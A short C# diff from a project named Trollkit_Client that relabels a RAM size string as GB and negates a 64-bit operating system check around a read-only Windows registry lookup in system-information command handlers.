@@ -70,7 +70,7 @@ namespace Trollkit_Client.Modules.CommandHandlers
 		{
 			ulong l;
 			GetPhysicallyInstalledSystemMemory(out l);
-			return ((l / 1024) /1024) + " Mb RAM";
+			return ((l / 1024) /1024) + " GB RAM";
 		}
 
 		private string GetGPUName()
@@ -122,7 +122,7 @@ namespace Trollkit_Client.Modules.CommandHandlers
 		{
 			RegistryKey key;
 
-			if (Environment.Is64BitOperatingSystem)
+			if (!Environment.Is64BitOperatingSystem)
 			{
 				key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", false);
 			}
